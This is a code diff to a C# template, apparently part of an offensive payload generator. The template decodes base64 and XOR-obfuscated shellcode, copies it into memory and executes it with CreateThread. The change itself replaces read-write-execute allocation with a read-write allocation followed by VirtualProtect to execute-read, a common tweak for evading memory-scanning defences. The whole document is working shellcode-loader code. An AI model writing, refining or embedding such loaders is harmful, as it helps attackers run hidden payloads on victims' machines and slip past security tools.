@@ -232,9 +232,12 @@ using System.Text;
 public class ClassExample
 {
     private static UInt32 MEM_COMMIT = 0x1000;
-    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+    private static UInt32 PAGE_READWRITE = 0x04;
+    private static UInt32 PAGE_EXECUTE_READ = 0x20;
     [DllImport("kernel32")]
-    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+    [DllImport("kernel32")]
+    private static extern bool VirtualProtect(IntPtr address, UInt32 size, UInt32 newProtect, out UInt32 oldProtect);
     [DllImport("kernel32")]
     private static extern IntPtr CreateThread(
         UInt32 lpThreadAttributes,
@@ -249,8 +252,10 @@ public class ClassExample
     public void Execute() {
         string raw = @"%s";
         byte[] shellcode = Convert.FromBase64String(xorIt("%s", Base64Decode(raw)));
-        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
         Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+        UInt32 oldProtect;
+        VirtualProtect((IntPtr)(funcAddr), (UInt32)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
         IntPtr hThread = IntPtr.Zero;
         UInt32 threadId = 0;
         IntPtr pinfo = IntPtr.Zero;
